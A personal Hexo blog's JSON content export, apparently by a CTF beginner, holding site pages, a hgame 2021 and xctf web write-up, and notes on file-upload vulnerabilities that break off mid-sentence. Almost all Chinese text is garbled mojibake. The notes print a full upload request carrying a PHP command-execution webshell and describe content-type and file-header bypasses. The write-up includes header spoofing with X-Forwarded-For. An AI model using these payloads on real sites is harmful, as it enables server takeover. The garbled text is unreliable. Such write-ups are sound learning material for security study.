{"meta":{"title":"NanIvy","subtitle":null,"description":"æ·¡æ·¡æ— åï¼Œæœˆä¸‹èµ·èˆã€‚","author":"NanIvy","url":""},"pages":[{"title":"about","date":"2020-10-31T04:14:36.000Z","updated":"2020-10-31T08:20:38.327Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[ã•ãã‚‰è˜ã®NanIvy] ä¸&nbsp; NanIvy&nbsp; ï¼ˆ èœèœå­èŒæ–° ï¼‰ å¯¹è¯ä¸­... bot_ui_ini()","keywords":"å…³äºæˆ‘"},{"title":"donate","date":"2020-10-30T15:13:05.000Z","updated":"2020-11-01T12:21:18.625Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"è°¢è°¢é¥²ä¸»äº†å–µ~"},{"title":"bangumi","date":"2020-12-10T13:32:48.000Z","updated":"2021-03-02T09:06:22.259Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"lab","date":"2012-10-31T06:47:59.000Z","updated":"2020-10-31T07:38:58.153Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakuraä¸»é¢˜Sakuraä¸»é¢˜yyds ç»èµè£…ä¿®ä¸­~","keywords":"Labå®éªŒå®¤"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-10-31T07:26:27.764Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"ç›´æ¥ä¸‹è½½ or æ‰«ç ä¸‹è½½ï¼š","keywords":"Androidå®¢æˆ·ç«¯"},{"title":"comment","date":"2020-10-30T15:13:48.000Z","updated":"2020-10-31T08:21:21.960Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"å¿µä¸¤å¥è¯— å™åˆ«æ¢¦ã€æ‰¬å·ä¸€è§‰ã€‚ ã€å®‹ä»£ã€‘å´æ–‡è‹±ã€Šå¤œæ¸¸å®«Â·äººå»è¥¿æ¥¼é›æ³ã€‹","keywords":"ç•™è¨€æ¿"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"music","date":"2020-10-31T05:14:28.000Z","updated":"2020-10-31T07:53:10.070Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"å–œæ¬¢çš„éŸ³ä¹"},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"links","date":"2020-10-31T07:11:06.000Z","updated":"2021-03-03T09:17:39.314Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"å‹äººå¸"},{"title":"theme-sakura","date":"2020-10-31T06:53:25.000Z","updated":"2020-10-31T08:14:21.100Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexoä¸»é¢˜Sakuraä¿®æ”¹è‡ªWordPressä¸»é¢˜Sakuraï¼Œæ„Ÿè°¢åŸä½œè€…Mashiroä»¥åŠæ„Ÿè°¢hojunå¤§ä½¬çš„åŠªåŠ›ã€‚","keywords":"Hexo ä¸»é¢˜ Sakura ğŸŒ¸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-10-31T07:57:00.590Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: 'æ”¾é€æ—¶é—´: 2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: '2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} ç•ªç»„è®¡åˆ’ è¿™é‡Œå°†æ˜¯æ°¸è¿œçš„å›å¿† window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} æ”¾é€æ—¶é—´: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"Bç«™"}],"posts":[{"title":"Hgame2021åŠxctfæ–°æ‰‹åŒºæ€»ç»“åŠwp","slug":"wp","date":"2021-03-02T16:00:00.000Z","updated":"2021-03-03T14:22:35.258Z","comments":true,"path":"2021/03/03/wp/","link":"","permalink":"/2021/03/03/wp/","excerpt":"","text":"x ctf web æ–°æ‰‹åŒº ç¬¬ä¸€æ’æ€»ç»“ï¼š å­¦ä¼šæ‰«æ å­¦ä¼šçœ‹f12é‡Œé¢å¡ä¸œè¥¿æ²¡æœ‰ å¤šå‡†å¤‡ç‚¹å­—å…¸ HTMLä»£ç é‡Œå¶å°”æœ‰æƒŠå–œ burpè¿˜æ˜¯yyds ç¬¬äºŒæ’ simpleâ€”phpï¼š &lt;?php show_source(__FILE__); include(&quot;config.php&quot;); $a=@$_GET[&#39;a&#39;]; $b=@$_GET[&#39;b&#39;]; if($a==0 and $a) { echo $flag1; } if(is_numeric($b)) { exit(); } if($b&gt;1234) { echo $flag2; } ?&gt; ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯ä»¥GETæ–¹å¼è·å¾—ä¸¤ä¸ªå‚æ•°aå’Œbï¼Œå¦‚æœaå’Œbæ»¡è¶³ä¸€å®šæ¡ä»¶ï¼Œåˆ™æ‰“å°flag1å’Œflag2ï¼ŒçŒœæµ‹å°†flag1å’Œflag2æ‹¼æ¥å°±èƒ½å¤Ÿå¾—åˆ°å®Œæ•´flag ï¼Ÿa=0e&amp;b=123454ee ç¬¬äºŒæ’ç¬¬äºŒé¢˜ï¼šget-posthcak barï¼ˆç«ç‹æµè§ˆå™¨ï¼‰ æ‰“å¼€ç›´æ¥æäº¤å³å¯ ç¬¬äºŒæ’ç¬¬ä¸‰é¢˜ï¼šxff-referer Xè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚ burpæŠ“åŒ…æ”¹xffå’Œrefererï¼Œå®Œäº†ã€‚ h game week1 webWEB -watermelonç®€ å• å° æ¸¸ æˆ æ‰“å¼€é¡µé¢ï¼Œæˆ‘ä¸€çœ‹ï¼Œå¥½å®¶ä¼™ï¼Œåˆæˆå¤§è¥¿ç“œã€‚ ç®€å•çš„ä¸Šå»é€ï¼Œgame overåå‘Šè¯‰ä½ 2000åˆ†ä»¥ä¸Šç»™flagï¼› =ã€‚=é‚£æˆ‘ç›´æ¥å¼€å§‹åˆ·2000åˆ†ï¼å¤ªèœäº†ï¼Œç®—äº†ã€‚ -Â·-å¼€å§‹è¯•å›¾çœ‹çœ‹èƒ½ä¸èƒ½burpæŠ“åŒ…æ”¹åˆ†æ•°ï¼Œç»“æœå¤©çœŸçš„å¤±è´¥äº†ï¼Œå°±æ²¡æœ‰è¿™ä¸ªæ“ä½œï¼› -Â·-ç„¶åå¼€å§‹å°è¯•èƒ½ä¸èƒ½ä»æºä»£ç é‡Œé¢æ‰¾ç‚¹ä¸œè¥¿ï¼Œè¿™é‡Œæˆ‘æ˜¯å…ˆè€ƒè™‘ä»jsæ–‡ä»¶é‡Œå¼€å§‹å¯»æ‰¾çš„ã€‚ æ‰“å¼€æ¯ä¸ªæ–‡ä»¶å¹¶è¿›è¡Œæœç´¢å…³é”®è¯ï¼šflagï¼Œ overï¼Œ score ç­‰ç­‰ï¼Œè¿˜æœ‰1999å’Œ2000ï¼ˆè€ƒè™‘åˆ°æ˜¯åˆ†æ•°&gt;1999æˆ–æ˜¯&gt;=2000ï¼‰ æœ€ååœ¨è¿™ä¸ª project.jsä¸­çœ‹åˆ°ç‚¹ä¸œè¥¿ï¼šåˆ†æ•°&gt;1999 æ˜¾ç¤ºä¸€æ®µåƒè¢«åŠ å¯†è¿‡çš„å­—ç¬¦ä¸²ï¼Œè¶Šæƒ³è¶Šè§‰å¾—è¿™æ˜¯æˆ‘è¦çš„ä¸œè¥¿â€”â€”è¿™ä¸²â€¦â€¦ä¹±ç ï¼Ÿæ‰“å¼€æµè§ˆå™¨ï¼Œbase64åœ¨çº¿è§£ç â€”â€”å¾—åˆ°flagã€‚æœ‰ä¸€è¯´ä¸€ï¼Œè¿™é¢˜ä¸å¤Ÿä¸¥è°¨ã€‚ hgame{do_you_know_cocos_game?} WEB-Hitchhiking_in_the_Galaxyå…ˆçœ‹é¢˜ï¼Œä¸€è®¿é—®ç•Œé¢åªæœ‰ä¸€ä¸ª404 ï¼Œå’Œä¸€ä¸ªè¶…é“¾æ¥ï¼Œä½†æ˜¯ç‚¹äº†ä¹‹åé¡µé¢æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç»†èŠ‚çš„å˜åŒ–ï¼Œç½‘å€ä»http://hitchhiker42.0727.site:42420å˜æˆäº†(http://hitchhiker42.0727.site:42420/index.php)åƒæ˜¯è·³è½¬è¿›ä¸€ä¸ªç½‘ç«™çš„ç¬é—´å†è¿›å…¥äº†å¦ä¸€ä¸ªç½‘ç«™ã€‚ é‡äº‹ä¸å†³å¼€burpï¼Œå¯¹è®¿é—®é“¾æ¥å‰åçš„é¡µé¢è¿›è¡ŒæŠ“åŒ…ï¼Œå†è®¿é—®é“¾æ¥çš„åŒ…é‡Œå‘ç°äº†ä¸œè¥¿ã€‚æç¤º405ï¼ˆé¡ºé£è½¦ä¸æ˜¯è¿™ä¹ˆæ­çš„ï¼‰ 405ä¸€èˆ¬æ˜¯è®¿é—®æ–¹æ³•å‡ºäº†é—®é¢˜ï¼Œå°è¯•æŠŠgetæ”¹ä¸ºpost å°è¯•æ­£ç¡®ï¼Œå‡ºç°æ–°çš„å›æ˜¾ï¼šè¦ä½¿ç”¨â€œæ— é™éæ¦‚ç‡å¼•æ“Infinite Improbability Driveâ€åŠï¼Œä½¿ç”¨xxæ¥è®¿é—® è€ƒè™‘æ”¹User-Agent: Infinite Improbability Driveã€‚ æˆåŠŸï¼Œåˆè¦æ±‚ä»å“ªé‡Œå“ªé‡Œè¿‡æ¥ï¼Œé‚£å°±Referer: https://cardinal.ink flagä»…èƒ½é€šè¿‡æœ¬åœ°è®¿é—®è·å¾— è€ƒè™‘xffæ”¹æœ¬åœ°ipï¼Œå³X-Forwarded-For: 127.0.0.1 ä¸‡èƒ½çš„å›è½¦é”®ï¼ å¾—åˆ°flag hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}","categories":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"/categories/ç”Ÿæ´»/"}],"tags":[{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"/tags/å­¦ä¹ /"},{"name":"CTF","slug":"CTF","permalink":"/tags/CTF/"}],"keywords":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"/categories/ç”Ÿæ´»/"}]},{"title":"webå­¦ä¹ ç¬”è®°â€”â€”æ–‡ä»¶ä¸Šä¼ ","slug":"webå­¦ä¹ ç¬”è®°â€”â€”æ–‡ä»¶ä¸Šä¼ ","date":"2021-01-28T16:00:00.000Z","updated":"2021-03-03T14:22:24.216Z","comments":true,"path":"2021/01/29/webå­¦ä¹ ç¬”è®°â€”â€”æ–‡ä»¶ä¸Šä¼ /","link":"","permalink":"/2021/01/29/webå­¦ä¹ ç¬”è®°â€”â€”æ–‡ä»¶ä¸Šä¼ /","excerpt":"","text":"æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“å¸¸è§å·¥å…·ï¼šBurpSuiteã€èšå‰‘ã€‚ åŸç†åŠåˆ©ç”¨ä¸ºä»€ä¹ˆä¼šæœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå­—é¢æ„æ€æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ã€‚åœ¨ä¸€äº›ä¸Šä¼ æ–‡ä»¶çš„å…¥å£ï¼Œé¢å¯¹ä¸Šä¼ æ–‡ä»¶ï¼Œè‹¥ä¸å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤å°±å®¹æ˜“é€ æˆè¿™æ¼æ´çš„äº§ç”Ÿã€‚å³å¯èƒ½ä¸Šä¼ ä»»ä½•æ–‡ä»¶â€”â€”åŒ…æ‹¬ç—…æ¯’ã€è„šæœ¬ã€‚ ä¸Šä¼ æ­£å¸¸çš„phpå¯¹æœåŠ¡å™¨æ²¡æœ‰ä»€ä¹ˆå±å®³ï¼Œä½†æ€»æœ‰ç¦»è°±çš„â€”â€”å¦‚ï¼šPHPæ˜¯ç¼–ç¨‹è¯­è¨€ï¼Œå¯ä»¥æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¸­çš„ä»£ç ï¼Œè¿˜èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸Šä¼ æ¶æ„çš„PHPæ–‡ä»¶ï¼Œç”šè‡³è¿˜èƒ½æ§åˆ¶æ•´ä¸ªç½‘ç«™æ–‡ä»¶ç”šè‡³æ˜¯æœåŠ¡å™¨ã€‚ æˆ–è€…æœ‰ä¸Šä¼ é’“é±¼å›¾ç‰‡çš„ï¼Œflashçš„ç­–ç•¥æ–‡ä»¶.xmlçš„ã€‚ ä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹çš„åˆ©ç”¨ï¼ŒæŒ‡çš„åº”è¯¥å°±æ˜¯â€œä¸Šä¼ webè„šæœ¬â€å¹¶è®©æœåŠ¡å™¨è§£æå§ã€‚å³webshellæ”»å‡»ã€‚æˆåŠŸçš„æ¡ä»¶ä¹Ÿæ˜¯æœ‰çš„ï¼šèƒ½ä¸Šä¼ ï¼Œèƒ½è°ƒç”¨ï¼Œèƒ½è¢«æ‰§è¡Œï¼Œä¸è¢«å®‰å…¨æ£€æŸ¥ï¼ˆæƒ³åŠæ³•ç»•è¿‡ï¼‰æˆ–æ ¼å¼åŒ–æˆ–è€…å›¾ç‰‡é©¬è¢«å‹ç¼©ï¼ˆå¯èƒ½ä¼šå¯¼è‡´å†…å®¹æ”¹å˜è€Œå½±å“åŠŸèƒ½ï¼‰ã€‚ å¸¸è§ç»•è¿‡æ€»ç»“å¸¸è§æ ¡éªŒä¸Šä¼ æ–‡ä»¶çš„æ–¹æ³•åŠå¯¹åº”ç»•è¿‡æ€è·¯å®¢æˆ·ç«¯æ ¡éªŒé€šè¿‡javascriptæ¥æ ¡éªŒä¸Šä¼ æ–‡ä»¶çš„åç¼€æ˜¯å¦åˆæ³•ï¼Œå¯ä»¥é‡‡ç”¨ç™½åå•ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨é»‘åå•çš„æ–¹å¼åˆ¤æ–­æ–¹å¼ï¼šåœ¨æµè§ˆåŠ è½½æ–‡ä»¶ï¼Œä½†è¿˜æœªç‚¹å‡»ä¸Šä¼ æŒ‰é’®æ—¶ä¾¿å¼¹å‡ºå¯¹è¯æ¡†ï¼Œå†…å®¹å¦‚ï¼šåªå…è®¸ä¸Šä¼ .jpg/.jpeg/.pngåç¼€åçš„æ–‡ä»¶ï¼Œè€Œæ­¤æ—¶å¹¶æ²¡æœ‰å‘é€æ•°æ®åŒ…ã€‚å®¢æˆ·ç«¯æ ¡éªŒç»•è¿‡ï¼šç›´æ¥ä¿®æ”¹jsä»£ç ï¼ˆä¸€äº›æµè§ˆå™¨è‡ªå¸¦é€‰é¡¹è²Œä¼¼æœ‰ç¦ç”¨jsé€‰é¡¹ï¼‰æˆ–è€…ä½¿ç”¨æŠ“åŒ…çš„æ–¹æ³•ä¿®æ”¹è¯·æ±‚å†…å®¹ç»•è¿‡ï¼Œå¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªgifæœ¨é©¬ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹ä¸º jsp/php/aspï¼Œåªç”¨è¿™ç§æ–¹æ³•æ¥æ£€æµ‹æ˜¯è‚¯å®šå¯ä»¥ç»•è¿‡çš„ã€‚ æœåŠ¡å™¨ç«¯æ ¡éªŒæ ¡éªŒè¯·æ±‚å¤´ content-typeå­—æ®µï¼Œä¾‹å¦‚ç”¨PHPæ£€æµ‹ if($_FILES[â€˜userfileâ€™][â€˜typeâ€™] != â€œimage/gifâ€){ â€¦.}é€šè¿‡è‡ªå·±å†™æ­£åˆ™åŒ¹é…æ¥åˆ¤æ–­æ–‡ä»¶å¹»æ•°(æ–‡ä»¶å¤´)å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œä¸€èˆ¬æ¥è¯´å±äºç™½åå•çš„æ£€æµ‹ï¼Œå¸¸è§çš„æ–‡ä»¶å¤´ï¼ˆæ–‡ä»¶å¤´æ ‡å¿—ä½ï¼‰å¦‚ä¸‹ï¼šæ‹¬å·ä¸­å¯¹åº”çš„äºŒè¿›åˆ¶ä»£ç ï¼ˆ1ï¼‰.JPEG;.JPE;.JPGï¼Œâ€JPGGraphicFileâ€ï¼ˆFFD8FFFE00ï¼‰ï¼ˆ2ï¼‰.gifï¼Œâ€GIF89Aâ€ï¼ˆ474946383961ï¼‰ï¼ˆ3ï¼‰.zipï¼Œâ€ZipCompressedâ€ï¼ˆ504B0304ï¼‰ï¼ˆ4ï¼‰.doc;.xls;.xlt;.ppt;.aprï¼Œâ€MSCompoundDocumentv1orLotusApproachAPRfileâ€ï¼ˆD0CF11E0A1B11AE1ï¼‰è¿˜æœ‰å…¶ä»–çš„æ–‡ä»¶å¤´å¯è‡ªè¡Œèµ„æ–™æŸ¥æ‰¾ã€‚ æœåŠ¡ç«¯ç»•è¿‡æ ¡éªŒè¯·æ±‚å¤´content-typeå­—æ®µç»•è¿‡ é€šè¿‡æŠ“åŒ…æ¥ä¿®æ”¹Httpå¤´çš„content-typeå³å¯ç»•è¿‡ï¼Œä¹Ÿè‚¯å®šæ˜¯å¯ä»¥ç»•è¿‡è¿™ç§æ£€æµ‹ POST /upload.php HTTP/1.1TE: deflate,gzip;q=0.3Connection: TE, closeHost: localhostUser-Agent: libwww-perl/5.803Content-Type: multipart/form-data; boundary=xYzZYContent-Length: 155â€“666666666666666666666666-Content-Disposition: form-data; name=â€userfileâ€; filename=â€shell.phpâ€Content-Type: image/gif (åŸä¸º Content-Type: text/plain)&lt;?php system($_GET[â€˜commandâ€™]);?&gt;â€“6666666666666666666666666- æ–‡ä»¶å¹»æ•°(æ–‡ä»¶å¤´)æ£€æµ‹ç»•è¿‡ï¼š åœ¨æœ¨é©¬å†…å®¹çš„å‰é¢æ’å…¥å¯¹åº”çš„æ–‡ä»¶å¤´å†…å®¹ï¼Œä¾‹å¦‚ï¼šGIF89a ï¼Œæ›´é è°±çš„æ–¹æ³•æ˜¯åœ¨å¯ä¸Šä¼ çš„æ–‡ä»¶ä¸­æ’å…¥æœ¨é©¬ä»£ç ï¼Œç„¶åä¿®æ”¹åç¼€ æ–‡ä»¶åŠ è½½æ£€æµ‹ï¼šä¸€èˆ¬æ˜¯è°ƒç”¨APIæˆ–å‡½æ•°å»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œä¾‹å¦‚å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼Œå½“æµ‹è¯•ç»“æœæ­£å¸¸çš„æ—¶å€™æ‰å…è®¸ä¸Šä¼  1ã€ä¸€æ¬¡æ¸²æŸ“ï¼ˆä»£ç 